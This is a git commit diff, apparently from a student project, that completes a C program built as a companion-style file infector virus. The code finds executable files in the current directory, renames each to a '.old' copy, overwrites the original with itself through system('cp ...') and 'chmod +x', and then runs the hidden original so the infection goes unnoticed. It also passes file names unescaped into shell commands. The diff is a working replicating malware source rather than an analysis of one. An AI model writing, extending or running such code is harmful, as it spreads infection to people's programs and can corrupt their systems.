954893bbbec79d448723109c1471cde06ff3b6a1
Enzo Cateau <enzo.cateau@etudiant.univ-lr.fr>
2026-03-22 19:32:20 +0100

    Completed main working

--- src/main.c
+++ src/main.c
@@ -1,5 +1,6 @@
 #include <dirent.h>
 #include <libgen.h>
+#include <stddef.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -10,6 +11,7 @@
 typedef struct {
   char new[1000];
   char old[1000];
+  char main[50];
 } pg;
 
 char *isInfected(pg *files) {
@@ -29,7 +31,7 @@ char *isInfected(pg *files) {
  * @params
  * @return
  */
-void infect(char *fileUninfected) {
+void infect(char *fileUninfected, char *prog_name) {
   DIR *dir;
   if ((dir = opendir(".")) == NULL) {
     perror("Cannot open .");
@@ -38,26 +40,23 @@ void infect(char *fileUninfected) {
   char *strToken = strtok(fileUninfected, "/");
   while (strToken != NULL) {
     char tempName[50];
-    FILE *fp1, *fp2;
-    char ch;
+    char cpQuery[50];
+    char chQuery[50];
 
     strcpy(tempName, strToken);
     strcat(tempName, ".old");
     rename(strToken, tempName);
+    snprintf(cpQuery, sizeof(cpQuery), "cp %s %s 2>/dev/null", prog_name,
+             strToken);
+    snprintf(chQuery, sizeof(chQuery), "chmod +x %s 2>/dev/null", strToken);
+    system(cpQuery);
+    system(chQuery);
 
-    fp1 = fopen("main", "r");
-    fp2 = fopen(strToken, "w");
-
-    while ((ch = getc(fp1)) != EOF)
-      putc(ch, fp2);
-
-    fclose(fp1);
-    fclose(fp2);
     strToken = strtok(NULL, "/");
   }
 }
 
-pg *fileFinder() {
+pg *fileFinder(char *prog_name) {
   DIR *dir;
   struct dirent *dp;
   static pg file;
@@ -69,28 +68,33 @@ pg *fileFinder() {
 
   while ((dp = readdir(dir)) != NULL) {
     struct stat st;
+
     if (stat(dp->d_name, &st) == 0 && S_ISREG(st.st_mode) &&
-        (st.st_mode & S_IXUSR) && strcmp(dp->d_name, "main")) {
-      printf("Nom : %s, Mode: %o\n", dp->d_name, st.st_mode);
+        (st.st_mode & S_IXUSR) && strcmp(dp->d_name, prog_name) != 0 &&
+        strcmp(dp->d_name, "main") != 0) {
+
       if (strstr(dp->d_name, "old") != NULL) {
         snprintf(file.old, sizeof(file.old), "%s/%s", file.old, dp->d_name);
       } else {
         snprintf(file.new, sizeof(file.new), "%s/%s", file.new, dp->d_name);
       }
+
+    } else if (strcmp(dp->d_name, prog_name) == 0) {
+      snprintf(file.main, sizeof(file.main), "%s", dp->d_name);
     }
   }
-
   closedir(dir);
   return &file;
 }
 
-int main(void) {
-  pg *files = fileFinder();
+int main(int argc, char *argv[]) {
+  char exeQuery[50];
+  char pathbuf[256];
+  snprintf(pathbuf, sizeof(pathbuf), "%s", argv[0]);
+  char *prog_name = basename(pathbuf);
+  pg *files = fileFinder(prog_name);
   char *fileUninfected = isInfected(files);
-  infect(fileUninfected);
-  char *strToken = strtok(fileUninfected, "/");
-  while (strToken != NULL) {
-    printf("%s\n", strToken);
-    strToken = strtok(NULL, "/");
-  }
+  infect(fileUninfected, prog_name);
+  snprintf(exeQuery, sizeof(exeQuery), "./%s.old 2>/dev/null", files->main);
+  system(exeQuery);
 }
